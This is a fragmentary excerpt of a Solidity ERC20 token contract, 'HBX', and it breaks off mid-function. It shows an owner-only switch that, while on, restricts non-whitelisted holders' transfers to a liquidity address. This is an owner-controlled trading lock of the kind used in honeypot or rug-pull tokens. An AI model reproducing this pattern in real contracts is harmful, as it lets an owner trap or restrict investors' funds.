...
contract HBX is ERC20, SafeOwnable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("HBX Token", "HBX") {
        _setupDecimals(18);
        isLimit = true;
    ...
    function openSell(bool open) external onlyOwner{
        isLimit = open;
    }
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual override {
        if ( !whitelist[from] && !whitelist[to]) {
            if(liquidity != address(0) && isLimit){
                require(to == liquidity, "err");
            } else {
